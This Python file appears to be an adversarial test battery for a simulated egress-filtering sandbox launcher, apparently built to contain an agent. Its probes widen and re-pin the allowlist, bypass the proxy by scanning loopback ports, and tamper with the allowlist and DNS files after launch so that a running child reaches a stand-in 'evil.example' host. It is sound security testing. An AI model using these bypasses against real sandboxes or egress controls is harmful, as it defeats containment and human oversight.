"""F136 independent review battery (stream 3, 2026-09-23).

F136 (MEDIUM, OPEN): "Filtered-egress mode exists only as lab prototype:
needs launcher + hardening before it is a product feature."
Close when: (1) a governed launcher exists, (2) the wall's components are
pinned/digest-verified like other loadables, (3) the residual threat model
is documented in the sandbox spec.

Wave-90 S7 delivered gov/egress_launcher.py + docs/egress_wall_threat_model.md
(R1-R11) + evals/s7egress_break.py (16 CLOSED / 5 CONTROL). This battery is
an INDEPENDENT adversarial review of the closure claim: it does not reuse
the S7 battery's probes. It tests properties the S7 battery does NOT pin:

  P0 control_fresh_launch            fresh wall launches (control)
  P1 repin_attack                    attacker with pin-dir write widens the
                                     allowlist and re-runs install(): the
                                     launcher accepts it -> R10 is real.
  P2 run_child_large_output_deadlock run_child(capture_output=True) with a
                                     200KB-output child -> deadlock (the
                                     popped-capture_output bug).
  P4 wall_death_child_survives       wall dies after launch; the running
                                     child is never re-checked -> R7 real.
  P5 child_direct_connect            sim child reaches the origin without
                                     the proxy -> R9 honest (lab proved
                                     the real topology, the sim doesn't).
  P6 preexec_reverifies_chain        tamper -> provider.check() is DOWN and
                                     child_recheck() refuses: the preexec
                                     re-assert re-verifies component
                                     digests, not just liveness.
  P7 launch_then_tamper_use          tamper AFTER launch is exploitable by
                                     the already-running child (proxy and
                                     DNS re-read their files per request);
                                     the next launch refuses -> sharpens
                                     R11: pinning is launch-time only.

Verdicts: CLOSED (closure property holds) / RESIDUAL-CONFIRMED (a
documented R1-R11 residual demonstrated real and accurately described) /
BUG (non-blocking defect, fail-hung not fail-open) / BREAK (a closure
criterion violated) / CONTROL / ERROR.

Run: TMPDIR=/tmp/gov-run-f136 ~/workspace/.gov-venv/bin/python \
       workstreams/redteam/f136/f136_review_probes.py
(cwd: the repo root /_WORK dir; hermetic, $0, no network)
"""

import json
import os
import socket
import subprocess
import sys
import tempfile
import threading
import time

HERE = os.path.dirname(os.path.abspath(__file__))
REPO_ROOT = os.path.dirname(os.path.dirname(os.path.dirname(HERE)))
for _p in (REPO_ROOT,):
    if _p not in sys.path:
        sys.path.insert(0, _p)

from gov.egress_launcher import (  # noqa: E402
    EgressLaunchRefused,
    FilteredEgressLauncher,
    SimulatedWallFixture,
    SimulatedWallProvider,
    WallComponentInventory,
    install_simulated_wall,
    repin_after_fixture_fixup,
    dns_query,
)


def _tmpdir():
    base = os.environ.get("TMPDIR", "/tmp")
    return tempfile.mkdtemp(prefix="f136rev-", dir=base)


def _fresh_wall_up(wall_id="f136rev"):
    tmp = _tmpdir()
    sim = os.path.join(tmp, "wall")
    install_simulated_wall(sim, wall_id=wall_id)
    events = []
    fix = SimulatedWallFixture(sim)
    fix.__enter__()
    inv = repin_after_fixture_fixup(sim)
    fix.inventory = inv
    launcher = FilteredEgressLauncher(
        manifest_path=os.path.join(sim, "wall_pins.json"),
        receipt_path=os.path.join(sim, "wall_receipt.json"),
        wall_provider=fix.provider(), audit=events.append)
    return sim, fix, inv, events, launcher


# ---------------------------------------------------------------- P0

def probe_control_fresh_launch():
    sim, fix, inv, events, launcher = _fresh_wall_up()
    try:
        cp = launcher.run_child(
            [sys.executable, "-c", "print('hello-wall')"],
            capture_output=True, text=True)
        if cp.returncode == 0 and "hello-wall" in cp.stdout:
            return ("CONTROL", "fresh wall: launch works")
        return ("ERROR", "rc=%r out=%r" % (cp.returncode, cp.stdout))
    finally:
        fix.__exit__()


# ---------------------------------------------------------------- P1

def probe_repin_attack():
    """R10: the receipt is sha256(manifest bytes) — self-consistent, not
    operator-anchored. An attacker who can write the pin dir widens the
    allowlist and re-runs install(); the launcher cannot tell
    'operator re-pinned' from 'attacker re-pinned'."""
    sim, fix, inv, events, launcher = _fresh_wall_up()
    try:
        allow = os.path.join(sim, "conf", "allowlist.txt")
        with open(allow, "a", encoding="utf-8") as f:
            f.write("evil.example:443\n")
        conf = os.path.join(sim, "conf")
        WallComponentInventory.install(
            {"nft_ruleset": os.path.join(conf, "agent0.nft.sim"),
             "proxy_allowlist": allow,
             "dns_config": os.path.join(conf, "dns_config.txt"),
             "dns_zone": os.path.join(conf, "dns_hosts.txt"),
             "proxy_impl": os.path.join(conf, "proxy_impl.txt"),
             "seccomp_config": os.path.join(conf, "seccomp_config.txt")},
            os.path.join(sim, "wall_pins.json"),
            os.path.join(sim, "wall_receipt.json"))
        launcher2 = FilteredEgressLauncher(
            manifest_path=os.path.join(sim, "wall_pins.json"),
            receipt_path=os.path.join(sim, "wall_receipt.json"),
            wall_provider=SimulatedWallProvider(
                sim, WallComponentInventory(
                    os.path.join(sim, "wall_pins.json"),
                    os.path.join(sim, "wall_receipt.json"))),
            audit=events.append)
        try:
            launcher2.verify()
        except EgressLaunchRefused as e:
            return ("ERROR", "re-pinned wall should verify: %s" % e)
        cp = launcher2.run_child(
            [sys.executable, "-c", "print('re-pinned')"],
            capture_output=True, text=True)
        if cp.returncode == 0:
            return ("RESIDUAL-CONFIRMED",
                    "R10 real: attacker re-pin verifies + launches; "
                    "receipt is self-consistent, not operator-anchored")
        return ("ERROR", "re-pinned launch failed rc=%r" % cp.returncode)
    finally:
        fix.__exit__()


# ---------------------------------------------------------------- P2

_P2_MARKER = "F136P2DEADLOCKMARKER"


def probe_run_child_large_output_deadlock():
    """run_child pops 'capture_output' into `capture` but then tests
    `popen_kw.get('capture_output')` (always None) -> falls into
    proc.wait() with stdout=PIPE -> deadlock once the child fills the
    64KB pipe buffer. Fail-hung, not fail-open: availability defect."""
    sim, fix, inv, events, launcher = _fresh_wall_up()
    outcome = {}

    def _run():
        try:
            cp = launcher.run_child(
                [sys.executable, "-c",
                 "import sys  # %s\nsys.stdout.write('X' * 200000)"
                 % _P2_MARKER],
                capture_output=True, text=True)
            outcome["done"] = (cp.returncode, len(cp.stdout or ""))
        except Exception as e:  # noqa: BLE001
            outcome["exc"] = repr(e)

    t = threading.Thread(target=_run, daemon=True)
    t.start()
    t.join(timeout=20)
    try:
        if t.is_alive():
            # Demonstrated: hung. Clean up the stuck child.
            subprocess.run(["pkill", "-f", _P2_MARKER],
                           capture_output=True, timeout=5)
            t.join(timeout=10)
            return ("BUG",
                    "run_child deadlocked on 200KB child output "
                    "(wait()-before-communicate; capture_output check "
                    "tests the popped kwarg). Availability defect, "
                    "fail-hung not fail-open.")
        if outcome.get("done") == (0, 200000):
            return ("CLOSED", "200KB child output drained cleanly")
        return ("ERROR", "unexpected outcome: %r" % (outcome,))
    finally:
        subprocess.run(["pkill", "-f", _P2_MARKER],
                       capture_output=True, timeout=5)
        fix.__exit__()


# ---------------------------------------------------------------- P4

def probe_wall_death_child_survives():
    """R7: 'the wall is not re-checked for the child's lifetime.' Launch
    a long-lived child, kill the wall, show the child keeps running and
    no re-check exists; a NEW launch still refuses (fail-closed at
    launch time holds)."""
    sim, fix, inv, events, launcher = _fresh_wall_up()
    sentinel = os.path.join(sim, "child_alive")
    child = ("import time, os\n"
             "open(%r, 'w').write('up')\n"
             "time.sleep(60)\n" % sentinel)
    proc = launcher.launch([sys.executable, "-c", child],
                           stdout=subprocess.DEVNULL,
                           stderr=subprocess.DEVNULL)
    try:
        for _ in range(50):
            if os.path.exists(sentinel):
                break
            time.sleep(0.1)
        if not os.path.exists(sentinel):
            return ("ERROR", "child never started")
        fix.__exit__()  # the wall dies: servers stopped, flag removed
        fix = None
        time.sleep(3)
        if proc.poll() is None:
            new_launch_refused = False
            try:
                launcher.run_child([sys.executable, "-c", "pass"],
                                   capture_output=True)
            except EgressLaunchRefused as e:
                new_launch_refused = ("wall_not_up" in str(e)
                                      or "wall_degraded" in str(e))
            proc.kill()
            if new_launch_refused:
                return ("RESIDUAL-CONFIRMED",
                        "R7 real: child survived wall death (no lifetime "
                        "re-check); new launches still refuse")
            return ("BREAK", "child survived AND new launch succeeded")
        proc.kill()
        return ("ERROR", "child died with the wall (rc=%r)" % proc.poll())
    finally:
        try:
            proc.kill()
        except OSError:
            pass
        if fix is not None:
            fix.__exit__()


# ---------------------------------------------------------------- P5

def probe_child_direct_connect():
    """R9: the sim models the launcher, not the topology. A sim child
    that ignores EGRESS_PROXY_ADDR can port-scan loopback and reach the
    origin directly — no IP-layer containment exists in the sim. (The
    GCP lab proved the real netns/nftables topology.)"""
    sim, fix, inv, events, launcher = _fresh_wall_up()
    try:
        child = (
            "import socket\n"
            "found = None\n"
            "for p in range(18070, 18096):\n"
            "    try:\n"
            "        s = socket.create_connection(('127.0.0.1', p),"
            " timeout=0.2)\n"
            "        s.sendall(b'GET / HTTP/1.0\\r\\n\\r\\n')\n"
            "        data = s.recv(1024)\n"
            "        s.close()\n"
            "        if b'200' in data:\n"
            "            found = p\n"
            "            break\n"
            "    except OSError:\n"
            "        pass\n"
            "print('DIRECT:' + str(found))\n")
        cp = launcher.run_child([sys.executable, "-c", child],
                                capture_output=True, text=True)
        if "DIRECT:18080" in (cp.stdout or ""):
            return ("RESIDUAL-CONFIRMED",
                    "R9 honest: sim child reached the origin directly, "
                    "bypassing the proxy — sim proves the launcher, "
                    "not the topology (lab proved that)")
        return ("ERROR", "rc=%r out=%r err=%r"
                % (cp.returncode, cp.stdout, cp.stderr))
    finally:
        fix.__exit__()


# ---------------------------------------------------------------- P6

def probe_preexec_reverifies_chain():
    """The preexec re-assert is stronger than it looks: check() runs the
    FULL receipt->manifest->components chain (via _pinned_ruleset_digest
    -> inventory.verify()), so component tamper between the parent's
    verify() and the child's preexec is caught. The remaining window is
    the documented R7 nanosecond sliver (preexec->exec, single
    process)."""
    sim, fix, inv, events, launcher = _fresh_wall_up()
    try:
        launcher.verify()  # passes pre-tamper
        allow = os.path.join(sim, "conf", "allowlist.txt")
        with open(allow, "a", encoding="utf-8") as f:
            f.write("evil.example:443\n")
        report = launcher.wall.check()
        if report.state == "UP":
            return ("BREAK", "check() stayed UP after component tamper")
        if "pin_verify" not in str(report.detail):
            return ("ERROR", "DOWN for the wrong reason: %r"
                    % (report.detail,))
        try:
            launcher.wall.child_recheck()
            return ("BREAK", "child_recheck passed with tampered pins")
        except EgressLaunchRefused:
            pass
        return ("CLOSED",
                "check() re-verifies the component chain (DOWN/"
                "pin_verify); child_recheck() refuses — preexec "
                "closes verify->spawn component tamper")
    finally:
        fix.__exit__()


# ---------------------------------------------------------------- P7

def probe_launch_then_tamper_use():
    """Sharpens R11 ('a component tampered after a child's launch is not
    detected until the next launch'): the running proxy and DNS re-read
    their files on EVERY request, so tamper-after-launch is live-
    exploitable by the already-running child with zero new launches.
    Phase 1: 403s. Tamper (no re-pin). Phase 2: 200 through the proxy.
    Then: a new launch refuses (pinning catches it — loudly, but after
    the exfil)."""
    sim, fix, inv, events, launcher = _fresh_wall_up()
    evil_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    evil_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    evil_sock.bind(("127.0.0.1", 0))
    evil_port = evil_sock.getsockname()[1]
    evil_sock.listen(8)
    stop = threading.Event()

    def _serve_evil():
        evil_sock.settimeout(0.3)
        while not stop.is_set():
            try:
                c, _ = evil_sock.accept()
            except socket.timeout:
                continue
            except OSError:
                break
            try:
                c.settimeout(2.0)
                c.recv(4096)
                c.sendall(b"HTTP/1.1 200 evil-ok\r\nContent-Length: 8\r\n"
                          b"\r\nevil-ok\n")
            except OSError:
                pass
            finally:
                c.close()

    t = threading.Thread(target=_serve_evil, daemon=True)
    t.start()
    child = (
        "import os, socket, sys, time\n"
        "proxy = os.environ['EGRESS_PROXY_ADDR']\n"
        "host, _, port = proxy.rpartition(':')\n"
        "target = 'evil.example:%d'\n"
        "for i in range(60):\n"
        "    try:\n"
        "        s = socket.create_connection((host, int(port)),"
        " timeout=3)\n"
        "        s.sendall(b'CONNECT ' + target.encode() + b' HTTP/1.1\\r\\n'\n"
        "                 b'Host: ' + target.encode() + b'\\r\\n\\r\\n')\n"
        "        resp = s.recv(1024)\n"
        "        line = resp.split(b'\\r\\n', 1)[0].decode('ascii',"
        " 'replace')\n"
        "        print('ATTEMPT %%d: %%s' %% (i, line), flush=True)\n"
        "        s.close()\n"
        "    except Exception as e:\n"
        "        print('ATTEMPT %%d: ERR %%r' %% (i, e), flush=True)\n"
        "    time.sleep(0.4)\n" % evil_port)
    proc = launcher.launch([sys.executable, "-c", child],
                           stdout=subprocess.PIPE,
                           stderr=subprocess.DEVNULL, text=True)
    try:
        time.sleep(2.5)  # phase 1: allowlist clean
        # Tamper AFTER launch: no re-pin, no new launch.
        with open(os.path.join(sim, "conf", "allowlist.txt"), "a",
                  encoding="utf-8") as f:
            f.write("evil.example:%d\n" % evil_port)
        with open(os.path.join(sim, "conf", "dns_hosts.txt"), "a",
                  encoding="utf-8") as f:
            f.write("evil.example 127.0.0.1\n")
        time.sleep(5)  # phase 2: proxy/DNS re-read tampered files
        proc.terminate()
        out, _ = proc.communicate(timeout=10)
        lines = [l for l in (out or "").splitlines()
                 if l.startswith("ATTEMPT")]
        phase1 = [l for l in lines[:5]]
        phase2 = [l for l in lines[8:]]
        p1_blocked = phase1 and all("403" in l for l in phase1)
        p2_established = any("200" in l for l in phase2)
        # The next launch must refuse loudly (pinning catches it).
        try:
            launcher.run_child([sys.executable, "-c", "pass"],
                               capture_output=True)
            next_refused = False
        except EgressLaunchRefused as e:
            next_refused = "component_tampered" in str(e)
        if p1_blocked and p2_established and next_refused:
            return ("RESIDUAL-CONFIRMED",
                    "R11 sharpened: post-launch tamper live-exploited by "
                    "the running child (proxy/DNS re-read per request); "
                    "next launch refuses component_tampered — pinning "
                    "is launch-time only")
        return ("ERROR" if not (p1_blocked and next_refused) else "BREAK",
                "p1_blocked=%r p2_established=%r next_refused=%r "
                "sample=%r" % (p1_blocked, p2_established, next_refused,
                               lines[:3]))
    finally:
        stop.set()
        try:
            proc.kill()
        except OSError:
            pass
        evil_sock.close()
        fix.__exit__()


PROBES = [
    ("control_fresh_launch", probe_control_fresh_launch),
    ("repin_attack", probe_repin_attack),
    ("run_child_large_output_deadlock",
     probe_run_child_large_output_deadlock),
    ("wall_death_child_survives", probe_wall_death_child_survives),
    ("child_direct_connect", probe_child_direct_connect),
    ("preexec_reverifies_chain", probe_preexec_reverifies_chain),
    ("launch_then_tamper_use", probe_launch_then_tamper_use),
]


def main():
    bad = 0
    counts = {}
    for name, fn in PROBES:
        try:
            verdict, detail = fn()
        except Exception as e:  # noqa: BLE001 - probe harness
            verdict, detail = "ERROR", "probe raised: %r" % e
        counts[verdict] = counts.get(verdict, 0) + 1
        if verdict in ("BREAK", "ERROR"):
            bad += 1
        print("%-34s %-18s %s" % (name, verdict, detail))
    print("----")
    print("summary: %s" % " ".join("%s=%d" % kv
                                   for kv in sorted(counts.items())))
    print("F136-REVIEW: %s" % ("GREEN" if bad == 0 else "RED"))
    return 1 if bad else 0


if __name__ == "__main__":
    sys.exit(main())
